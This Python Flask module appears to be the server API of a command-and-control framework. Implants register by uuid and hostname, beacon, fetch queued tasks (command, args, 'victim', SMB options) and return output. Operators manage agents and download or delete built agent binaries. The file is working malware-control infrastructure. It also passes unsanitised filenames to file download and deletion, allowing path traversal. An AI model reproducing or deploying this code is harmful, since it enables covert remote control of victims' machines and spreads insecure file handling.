from flask import Blueprint, request, send_from_directory
from flask_login import current_user
import json

from ..components.decorators import *
from ..console import Color, Logger

from .database import *
from .transport import Transport
from .operators import OperatorRoles

import os
import shutil

import __main__

# API Service
service = Blueprint("service", __name__, url_prefix="/service")

serviceConf: dict = {
    "online": bool(),
    "logging": bool(),
    "secret_key": None}

def is_valid_key(key: str):
    from ..settings import secret_key
    if key is None:
        logger.error("No key was given!", "\n")
        return False
    elif key != secret_key:
        logger.error(f"Invalid key: {key}", "\n")
        return False
    return True

def was_given(field: str, jdata_keys: list[str]):
    if not field in jdata_keys:
        logger.error(f"No {field} was given!", "\n")
        return False
    else:
        return True

logger = None

@EnableComponents(globals(), "service", args=["service_dict"])
def init_service(service_conf, service_dict = __main__.__dict__):
    global serviceConf, logger
    serviceConf = service_conf
    logger = Logger(active=serviceConf.get("logging"))

    HANDLE_PCPKGS

@service.route("")
@service.route("/")
def status():
    """
    Function to get the status of the api service
    """
    if serviceConf["online"]:
        logger.success("Getting Service status (online)", "\n")
        return Transport("online", "out")
    else:
        logger.success("Getting Service status (offline)", "\n")
        return Transport("offline", "out")

@service.route("/bind", methods = {"POST"})
def bind():
    """
    Function to bind a Agent to the server
    """
    try:
        jdata: dict = json.loads(Transport(request.data.decode(), "in"))
    except:
        return Transport("FAILED", "out")

    if not was_given("uuid", jdata.keys()):
        return Transport("FAILED", "out")
    uuid: str = jdata["uuid"]

    if Agent.exists(uuid):
        Agent.update_beacon(uuid)
        logger.success(f"Checked in Agent: {uuid}", "\n")
    
    else:
        if not was_given("hostname", jdata.keys()):
            return Transport("FAILED", "out")
        hostname: str = jdata["hostname"]

        newAgent = Agent(uuid=uuid, hostname=hostname)
        db.session.add(newAgent)
        db.session.commit()
        logger.success(f"Added new Agent: {uuid}", "\n")

    return Transport("OK", "out")

@service.route("/task", methods = {"POST", "GET", "DELETE"})
def task():
    """
    Function to:
        GET The next task to execute.
        POST A new task and add it to an Agent to be executed.
        DELETE A task by id
    """

    if request.method == "DELETE":
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED", "out")

        try:
            id = int(request.args.get('id'))
        except:
            logger.error(f"Invalid id: {id}")
            return Transport("FAILED", "out")

        Task.delete(id)
        logger.success(f"Deleted Task by id: {id}")
        return Transport("OK", "out")

    try:
        jdata: dict = json.loads(Transport(request.data.decode(), "in"))
    except:
        return Transport("FAILED", "out")

    if not was_given("uuid", jdata.keys()):
        return Transport("FAILED", "out")
    uuid: str = jdata["uuid"]

    if not Agent.exists(uuid):
        logger.error(f"Agent {uuid} dose not exist!", "\n")
        return Transport("FAILED", "out")

    if request.method == "POST":
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED", "out")

        if not was_given("task", jdata.keys()):
            return Transport("FAILED", "out")
        jtask = jdata["task"]
        keys = jtask.keys()
    
        if not was_given("command", keys) or \
        not was_given("args", keys) or \
        not was_given("victim", keys) or \
        not was_given("operator", keys) or \
        not was_given("delay", keys) or \
        not was_given("execTime", keys) or \
        not was_given("file", keys) or \
        not was_given("usesmb", keys) or \
        not was_given("actsmb", keys):
            return Transport("FAILED", "out")

        command: str  = jtask["command"]
        args: str     = jtask["args"]
        victim: str   = jtask["victim"]
        operator: str = jtask["operator"]
        delay: int    = jtask["delay"]
        execTime: int = jtask["execTime"]
        file: str     = jtask["file"]
        usesmb: str   = jtask["usesmb"]
        actsmb: str   = jtask["actsmb"]

        agent_id = Agent.get_by_uuid(uuid).id
        newTask = Task(
            command=command,
            args=args,
            victim=victim,
            operator=operator,
            delay=delay,
            execTime=execTime,
            file=file,
            usesmb=usesmb,
            actsmb=actsmb, 
            agent_id=agent_id
        )
        db.session.add(newTask)
        db.session.commit()

        logger.success(f"Added new Task for Agent: {uuid}", "\n")
        return Transport(str(newTask.id), "out")

    elif request.method == "GET":
        Agent.update_beacon(uuid)

        logger.success(f"Geting next Task for Agent: {uuid}", "\n")
        task = Agent.get_nextTask(uuid)

        if task != None:
            return Transport(task.jsonify(), "out")
        else:
            return Transport("NONE", "out")

@service.route("/reply", methods = {"POST", "GET"})
def reply():
    if request.method == "POST":
        try:
            jdata: dict = json.loads(Transport(request.data.decode(), "in"))
        except:
            return Transport("FAILED", "out")

        if not was_given("task_id", jdata.keys()):
            return Transport("FAILED", "out")
        task_id: str = jdata["task_id"]

        if not was_given("uuid", jdata.keys()):
            return Transport("FAILED", "out")
        uuid: str = jdata["uuid"]

        if not Agent.exists(uuid):
            logger.error(f"Agent {uuid} dose not exist!", "\n")
            return Transport("FAILED", "out")
        Agent.update_beacon(uuid)

        if not was_given("content", jdata.keys()):
            return Transport("FAILED", "out")
        content: str = jdata["content"]

        logger.success(f"Setting reply for Task: {task_id}", "\n")
        Task.get_by_id(task_id).set_reply(content)

        return Transport("OK", "out")

    else:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED", "out")

        try:
            id = int(request.args.get('id'))
        except:
            logger.error(f"Invalid id: {id}", "\n")
            return Transport("FAILED", "out")

        if id is None:
            logger.error(f"No id was given!", "\n")
            return Transport("FAILED", "out")

        task = Task.get_by_id(id)
        if task is None or task.get_reply() is None:
            return Transport("NONE", "out")
        else:
            logger.success(f"Getting reply of Task: {id}", "\n")
            print(task.get_reply())
            return Transport(task.get_reply(), "out")

@service.route("/agents", methods = {"GET", "DELETE"})
def agents():
    if not current_user.is_authenticated:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED", "out")
    else:
        if not current_user.role in [OperatorRoles.ADMIN.get('name'), OperatorRoles.OPERATOR.get('name')]:
            logger.error(f"current_operator.role is not ADMIN or OPERATOR!", "\n")
            return Transport("FAILED", "out")

    if request.method == "GET":
        agents = Agent.query.all()
        if agents is None:
            return Transport("NONE", "out")

        dict_repr = dict()
        for agent in agents:
            jagent: dict = agent.jsonify(asDict=True)
            jagent.pop("id")
            dict_repr[str(agent.id)] = jagent
        
        logger.success(f"Getting all Agents!", "\n")
        return Transport(json.dumps(dict_repr), "out")

    else:
        Agent.delete_all()
        logger.success(f"Deleted all Agents!", "\n")
        return Transport("OK", "out")


@service.route("/agent", methods = {"GET", "DELETE"})
def agent():
    if not current_user.is_authenticated:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED", "out")
    else:
        if not current_user.role in [OperatorRoles.ADMIN.get('name'), OperatorRoles.OPERATOR.get('name')]:
            logger.error(f"current_operator.role is not ADMIN or OPERATOR!", "\n")
            return Transport("FAILED", "out")

    try:
        id = int(request.args.get('id'))
    except:
        logger.error(f"Invalid id: {id}", "\n")
        return Transport("FAILED", "out")

    if id is None:
        logger.error(f"No id was given!", "\n")
        return Transport("FAILED", "out")

    if request.method == "GET":
        agent = Agent.query.filter_by(id=id).first()
        if agent is None:
            logger.error(f"No Agent found with id: {id}", "\n")
            return Transport("FAILED", "out")
        logger.success(f"Getting Agent with id: {id}", "\n")
        return Transport(agent.jsonify(), "out")

    else:        
        Agent.delete(id)
        logger.success(f"Deleted Agent by id: {id}", "\n")
        return Transport("OK", "out")

@service.route("/operators", methods = {"GET", "DELETE"})
def operators():
    if not current_user.is_authenticated:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED", "out")
    else:
        if not current_user.role == OperatorRoles.ADMIN.get('name'):
            logger.success(f"current_operator.role is not ADMIN!", "\n")
            return Transport("FAILED", "out")

    if request.method == "GET":
        operators = Operator.query.all()
        if operators is None:
            return Transport("NONE", "out")

        dict_repr = dict()
        for operator in operators:
            joperator: dict = operator.jsonify(asDict=True)
            joperator.pop('id')
            dict_repr[str(operator.id)] = joperator

        logger.success(f"Getting all Operators!", "\n")
        return Transport(json.dumps(dict_repr), "out")

    else:
        Operator.delete_all()
        logger.success(f"Deleted all Operators!", "\n")
        return Transport("OK", "out")


@service.route("/operator", methods = {"GET", "DELETE", "PUT"})
def operator():
    if not current_user.is_authenticated:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED", "out")
    else:
        if not current_user.role == OperatorRoles.ADMIN.get('name'):
            logger.success(f"current_operator.role is not ADMIN!", "\n")
            return Transport("FAILED", "out")

    try:
        id = int(request.args.get('id'))
    except:
        logger.error(f"Invalid id: {id}", "\n")
        return Transport("FAILED", "out")

    if id is None:
        logger.error(f"No id was given!", "\n")
        return Transport("FAILED", "out")

    if request.method == "GET":
        operator = Operator.query.filter_by(id=id).first()
        if operator is None:
            logger.error(f"No Operator found with id: {id}", "\n")
            return Transport("FAILED", "out")
        logger.success(f"Getting Operator with id: {id}", "\n")
        return Transport(operator.jsonify(), "out")

    elif request.method == "PUT":
        try:
            jdata: dict = json.loads(Transport(request.data.decode(), "in"))
        except:
            return Transport("FAILED", "out")
        keys = jdata.keys()
        if not was_given("id", keys) or \
        not was_given("name", keys) or \
        not was_given("pwd_hash", keys) or \
        not was_given("role", keys):
            return Transport("FAILED", "out")
        id: int = int(jdata["id"])
        name: str = jdata["name"]
        pwd_hash: str = json.dumps(jdata["pwd_hash"])
        role: str = jdata["role"]

        if Operator.exists(id=id):
            operator = Operator.query.filter_by(name=name).first()
            if operator:
                if operator.id != id:
                    serviceConf["logging"]: logger.error(f"Operator with name '{name}' alredy exists!", "\n")
                    return Transport("FAILED", "out")

            operator: Operator = Operator.query.filter_by(id=id).first()
            operator.name = name
            operator.pwd_hash = pwd_hash
            operator.role = role
            
            db.session.commit()

            logger.success(f"Updating Operator with id: {id}", "\n")
            return Transport("OK", "out")
        else:
            serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Operator with id '{id}' dose not exist!", "\n")
            return Transport("FAILED", "out")

    else:        
        Operator.delete(id)
        serviceConf["logging"]: logger.success(f"Deleted Operator by id: {id}", "\n")
        return Transport("OK", "out")

@service.route("/downloadbin")
def downloadbin():
    if not current_user.is_authenticated:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED", "out")

    from ..settings import instance_path

    filename = request.args.get('filename')

    if os.path.exists(os.path.join(instance_path, "agentlab", "build", filename)):
        return send_from_directory(directory=os.path.join(instance_path, "agentlab", "build"), path=filename)
    else:
        return Transport("Dose not Exist!", "out")

@service.route("/deletebin", methods={"DELETE"})
def deletebin():
    if not current_user.is_authenticated:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED", "out")

    from ..settings import instance_path

    filename = request.args.get("filename")
    if filename == "all":#from ..settings import instance_path
        path = os.path.join(instance_path, "agentlab", "build")
        binarys = [os.path.join(path, file) for file in os.listdir(path)]
        for binary in binarys:
            os.remove(binary)
        return Transport("OK", "out")
    else:
        binary = os.path.join(instance_path, "agentlab", "build", filename)
        if os.path.exists(binary):
            os.remove(binary)
            return Transport("OK", "out")
        else:
            return Transport("FAILED", "out")